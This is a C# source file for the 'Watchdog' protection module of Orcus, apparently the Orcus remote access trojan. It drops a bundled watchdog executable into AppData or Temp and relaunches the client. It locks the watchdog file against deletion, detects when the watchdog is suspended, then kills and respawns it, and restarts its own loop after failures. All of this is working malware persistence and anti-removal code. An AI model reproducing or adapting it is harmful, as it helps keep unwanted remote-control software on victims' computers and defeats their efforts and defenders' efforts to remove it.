using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;
using Orcus.Config;
using Orcus.Shared.Settings;

#if !DEBUG
using Orcus.Shared.Utilities;
using Orcus.Utilities;
#endif

namespace Orcus.Protection
{
    public static class Watchdog
    {
        private static int _processId;
        private static Process _watchdogProcess;

        public static bool IsEnabled { get; private set; }

        public static void Close()
        {
            if (!IsEnabled)
                return;

            IsEnabled = false;
            try
            {
                _watchdogProcess?.Kill();
            }
            catch (Exception)
            {
                // ignored
            }
            _watchdogProcess = null;
        }

        public static void Initizalize()
        {
            if (IsEnabled)
                return;

            IsEnabled = true;

            var args = Environment.GetCommandLineArgs().ToList();

            if (args.Contains("/keepAlive"))
                int.TryParse(args[args.IndexOf("/keepAlive") + 1], out _processId);

            new Thread(KeepAlive) {IsBackground = true}.Start();
            SystemEvents.SessionEnding += (sender, eventArgs) => Close();
        }

        private static void KeepAlive()
        {
            var failed = false;
            FileStream fileStream = null;
            FileInfo watchdogFile = null;

            try
            {
                var currentProcessId = Process.GetCurrentProcess().Id;

                WaitHandle[] waitHandles =
                {
                    new ManualResetEvent(false), 
                    new ManualResetEvent(false)
                };

                WaitCallback waitForExitCallback = state =>
                {
                    var autoResetEvent = (ManualResetEvent) state;
                    try
                    {
                        _watchdogProcess.WaitForExit();
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                    autoResetEvent.Set();
                };
                WaitCallback waitForSuspensionCallback = state =>
                {
                    var autoResetEvent = (ManualResetEvent) state;
                    try
                    {
                        if (WaitForSuspension(_watchdogProcess))
                            _watchdogProcess.Kill();
                        else
                            return; //was killed, other waithandle must have reacted
                        //NOTE: Fine Brothers Entertainment might sue us, not sure if this comment has to be changed
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                    autoResetEvent.Set();
                };

                while (IsEnabled)
                {
                    string path;
                    if (_processId == 0)
                    {
                        if (watchdogFile == null || !watchdogFile.Exists)
                            watchdogFile = WriteWatchdogFile();

                        if (watchdogFile == null)
                            return;

                        var process = Process.Start(watchdogFile.FullName,
                            $"/launchSelfAndExit \"{Assembly.GetEntryAssembly().Location}\" {currentProcessId}{(Settings.GetBuilderProperty<WatchdogBuilderProperty>().PreventFileDeletion ? " /protectFile" : "")}");

                        if (process == null)
                            return;

                        process.WaitForExit();
                        _watchdogProcess = Process.GetProcessById(process.ExitCode);
                        path = watchdogFile.FullName;
                    }
                    else
                    {
                        try
                        {
                            _watchdogProcess = Process.GetProcessById(_processId);
                        }
                        catch (Exception)
                        {
                            continue; //process is not running
                        }
                        finally
                        {
                            _processId = 0;
                        }
                        path = _watchdogProcess.MainModule.FileName;
                    }

                    if (Settings.GetBuilderProperty<WatchdogBuilderProperty>().PreventFileDeletion)
                        fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);

                    //important because one will always be set if this isn't the first loop
                    for (int i = 0; i < waitHandles.Length; i++)
                        ((ManualResetEvent) waitHandles[i]).Reset();

                    ThreadPool.QueueUserWorkItem(waitForExitCallback, waitHandles[0]);
                    ThreadPool.QueueUserWorkItem(waitForSuspensionCallback, waitHandles[1]);
                    WaitHandle.WaitAny(waitHandles);
                }
            }
            catch (Exception)
            {
                failed = true;
            }
            finally
            {
                Close();
                fileStream?.Dispose();
            }

            if (failed)
                Initizalize();
        }

        private static bool WaitForSuspension(Process process)
        {
            while (!process.HasExited)
            {
                process.Refresh();
                foreach (ProcessThread thread in process.Threads)
                {
                    if (thread.ThreadState == System.Diagnostics.ThreadState.Wait &&
                        thread.WaitReason == ThreadWaitReason.Suspended)
                        return true;
                }

                Thread.Sleep(500);
            }

            return false;
        }

        private static FileInfo WriteWatchdogFile()
        {
#if DEBUG
            return new FileInfo(@"..\..\..\Features\Orcus.Golem\bin\Debug\Orcus.Golem.exe");
#else
            var watchdogProperty = Settings.GetBuilderProperty<WatchdogBuilderProperty>();

            string directory;
            switch (watchdogProperty.WatchdogLocation)
            {
                case WatchdogLocation.AppData:
                    directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    break;
                case WatchdogLocation.Temp:
                    directory = Path.GetTempPath();
                    break;
                default:
                    return null;
            }

            var watchdogFile = new FileInfo(Path.Combine(directory, watchdogProperty.Name));
            if (watchdogFile.Exists)
            {
                //wait until the file is free (up to 5 x 50 = 250 ms)
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        watchdogFile.Delete();
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                    Thread.Sleep(50);
                }

                if (watchdogFile.Exists)
                    watchdogFile = new FileInfo(FileExtensions.MakeUnique(watchdogFile.FullName));
            }

            try
            {
                ResourceHelper.WriteGZippedResourceToFile(watchdogFile.FullName, "Orcus.Watchdog.exe.gz");
            }
            catch (Exception)
            {
                return null;
            }

            File.WriteAllText(watchdogFile.FullName + ".config", Properties.Resources.AppConfig);

            watchdogFile.Refresh();
            return watchdogFile;
#endif
        }
    }
}